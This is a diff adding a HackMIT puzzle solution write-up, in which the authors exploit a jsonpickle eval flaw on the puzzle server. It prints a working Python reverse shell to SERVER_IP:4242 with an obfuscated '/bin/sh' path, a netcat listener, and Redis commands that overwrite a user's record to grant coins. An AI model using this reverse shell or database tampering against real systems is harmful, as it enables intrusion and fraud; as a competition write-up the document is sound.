@@ -1,3 +1,4 @@
+
 # HackMIT Puzzles Solution
 
 ## Entrypoint: Get puzzle link
@@ -52,5 +53,44 @@ After doing that approximately 14 times, it gave you the money to be able to buy
 
 
 ## Puzzle 4: How to become a millionare in 12736 easy steps
+![Puzzle 4 preview](https://i.imgur.com/o4tCien.png)Well, the solution to this puzzle is totally different from what the creators of the puzzle expected. While solving the puzzle we realized that the ``jsonpickle`` library could be injected with Python code thanks to a vulnerability. 
+
+The vulnerability was that when the JSON was decoded it would decode into an ``.eval()``, allowing us to execute arbitrary code from the server.
+
+The code we decided to run was a reverse shell (running directly in Python):
+```python
+CODE = """
+import socket, os, pty
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((SERVER_IP, 4242))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+pty.spawn("\\x2f" + "bin" + "\\x2f" + "sh")
+""".strip().replace("\n", ";")
+```
+
+Before executing the code shown we had to have a netcat listener in order to receive the connection.
+
+We could have used the following code on any Linux computer
+```sh
+nc -lvp 4242
+```
+Having access to the server, simply connect to the Redis server with the Telnet protocol
+```sh
+telnet 127.0.0.1 6379
+```
+
+Having access to the database, we select database 0 and ask for our user's data.
+```sh
+select 0
+get loremipsum_000000
+```
+This will give us a JSON. When we do that we will change the value of our user for the one modified by us, which will have the necessary coins to pass the puzzle.
+
+```sh
+set loremipsum_000000 'HERE YOU SHOULD PLACE YOUR MODIFIED JSON'
+```
+Doing this procedure the only thing left to do would be to go to your ``exchange.py`` and donate to get the key.
 
 ## Puzzle 5: WE LOVE CHAD 🌙
